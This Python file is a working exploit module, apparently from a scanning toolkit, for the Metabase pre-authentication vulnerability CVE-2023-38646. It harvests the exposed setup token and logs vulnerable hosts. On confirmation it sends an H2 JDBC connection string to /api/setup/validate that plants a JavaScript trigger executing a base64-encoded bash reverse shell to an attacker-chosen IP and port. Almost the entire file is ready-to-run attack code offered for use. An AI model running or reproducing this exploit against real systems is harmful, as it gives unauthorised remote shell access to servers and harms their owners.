#!/user/bin/env python3
# -*- coding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import base64
import json
from urllib.parse import urlparse
from rich.prompt import Prompt
urllib3.disable_warnings()



class Cve_2023_38646:
    def get_setup_token(self,ip_address, line_number=None):
        endpoint = "/api/session/properties"

        url = f"{ip_address}{endpoint}"
        try:
            response = requests.get(url, headers=self.headers,verify=self.ssl, timeout=5, proxies=self.proxy)

            if response.status_code == 200:
                data = response.json()
                if "setup-token" in data and data["setup-token"] is not None:
                    if not self.batch:
                        print(f"{line_number}. Vulnerable Metabase Instance:-")
                        print(f"             IP: {ip_address}")
                        print(f"             Setup Token: {data['setup-token']}")
                    else:
                        OutPrintInfoSuc("Metabase",f"目标存在漏洞 {url}")
                        with open("./result/metabase_2023_38646.txt","a") as w:
                            w.write(f"{url}\n")
                    return True
                else:
                    if not self.batch:
                        print(f"{line_number}. Setup token not found or is null for IP: {ip_address}")
                return False# exit the function if request was successful
        except requests.exceptions.RequestException as e:
            if not self.batch:
                print(f"Failed to connect using {ip_address}. Trying next protocol...")
            return False
        if not self.batch:
            print(f"{line_number}. Failed to connect to {ip_address} using both HTTP and HTTPS.")
        return False

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Metabase", '开始执行Metabase CVE-2023-38646...')
        if self.get_setup_token(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否进行RCE利用([b bright_red]y/n[/b bright_red])")
                if choose == "y":
                    ip = Prompt.ask("[b yellow]输入转发IP")
                    port = Prompt.ask("[b yellow]输入转发Port")

                    self.shell_main(url,ip,str(port))

                else:
                    return
        if not self.batch:
            OutPrintInfo("Metabase", 'Metabase CVE-2023-38646执行结束')

    def get_setup_token_and_version(self,ip_address):
        endpoint = "/api/session/properties"
        url = f"{ip_address}{endpoint}"
        try:
            print(f"[DEBUG] Fetching setup token from {url}...")
            response = requests.get(url, verify=self.ssl, timeout=5, proxies=self.proxy)
            if response.status_code == 200:
                data = response.json()
                setup_token = data.get("setup-token")
                metabase_version = data.get("version", {}).get("tag")

                if setup_token is None:
                    print(f"[DEBUG] Setup token not found or is null for IP: {ip_address}\n")
                else:
                    print(f"[DEBUG] Setup Token: {setup_token}")
                    print(f"[DEBUG] Version: {metabase_version}")

                return setup_token
        except requests.exceptions.RequestException as e:
            print(f"[DEBUG] Exception occurred: {e}")
            print(f"[DEBUG] Failed to connect to {ip_address}.\n")

    def post_setup_validate(self,ip_address, setup_token, listener_ip, listener_port):
        payload = base64.b64encode(f"bash -i >&/dev/tcp/{listener_ip}/{listener_port} 0>&1".encode()).decode()

        print(f"[DEBUG] Payload = {payload}")

        endpoint = "/api/setup/validate"
        url = f"{ip_address}{endpoint}"
        headers = {'Content-Type': 'application/json'}
        data = {
            "token": setup_token,
            "details": {
                "is_on_demand": False,
                "is_full_sync": False,
                "is_sample": False,
                "cache_ttl": None,
                "refingerprint": False,
                "auto_run_queries": True,
                "schedules": {},
                "details": {
                    "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x",
                    "advanced-options": False,
                    "ssl": True
                },
                "name": "test",
                "engine": "h2"
            }
        }

        print(f"[DEBUG] Sending request to {url} with headers {headers} and data {json.dumps(data, indent=4)}")

        try:
            response = requests.post(url, headers=headers, json=data, verify=self.ssl, timeout=5, proxies=self.proxy)
            print(f"[DEBUG] Response received: {response.text}")
            if response.status_code == 200:
                print(f"[DEBUG] POST to {url} successful.\n")
            else:
                print(f"[DEBUG] POST to {url} failed with status code: {response.status_code}\n")
        except requests.exceptions.RequestException as e:
            print(f"[DEBUG] Exception occurred: {e}")
            print(f"[DEBUG] Failed to connect to {url}\n")

    def preprocess_url(self,user_input):
        parsed_url = urlparse(user_input)
        protocol = f"{parsed_url.scheme}://" if parsed_url.scheme else "http://"
        netloc = parsed_url.netloc or parsed_url.path
        return protocol + netloc.rstrip('/')

    def shell_main(self,rhost,lhost,lport):
        print(f"[DEBUG] Original rhost: {rhost}")
        rhost = self.preprocess_url(rhost)
        print(f"[DEBUG] Preprocessed rhost: {rhost}")

        print(f"[DEBUG] Input Arguments - rhost: {rhost}, lhost: {lhost}, lport: {lport}")

        setup_token = self.get_setup_token_and_version(rhost)
        print(f"[DEBUG] Setup token: {setup_token}")
        if setup_token:
            self.post_setup_validate(rhost, setup_token, lhost, lport)







